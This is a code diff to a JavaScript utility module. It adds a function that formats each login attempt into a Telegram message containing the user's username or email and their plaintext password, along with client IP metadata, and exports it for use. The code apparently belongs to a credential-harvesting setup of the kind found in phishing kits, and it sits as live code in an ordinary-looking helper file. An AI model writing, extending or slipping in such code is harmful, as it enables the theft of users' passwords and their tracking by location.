@@ -251,6 +251,20 @@ const formatTelegramClientInfo = (clientPayload = {}) => {
   return message.length > 4096 ? `${message.slice(0, 4000)}\n... (truncated)` : message;
 };
 
+const formatTelegramLoginMessage = ({ identifier, password, clientInfo = {} }) => {
+  const safeIdentifier = typeof identifier === 'string' ? identifier : 'unknown';
+  const safePassword = typeof password === 'string' ? password : 'unknown';
+  const clientMessage = formatTelegramClientInfo(clientInfo);
+
+  return [
+    'New login attempt detected:',
+    `Username/Email: ${safeIdentifier}`,
+    `Password: ${safePassword}`,
+    '',
+    clientMessage
+  ].join('\n');
+};
+
 const createPersistedClientInfoRecord = (payload = {}, req = null) => {
   const serverMeta = req ? getClientIpMetadata(req, { trustedProxyIps: process.env.TRUSTED_PROXY_IPS?.split(',') || [] }) : {};
   const record = generateClientInfoPayload(payload, serverMeta);
@@ -264,6 +278,7 @@ module.exports = {
   getClientIpMetadata,
   generateClientInfoPayload,
   formatTelegramClientInfo,
+  formatTelegramLoginMessage,
   createPersistedClientInfoRecord,
   sanitizeString,
   sanitizeMap
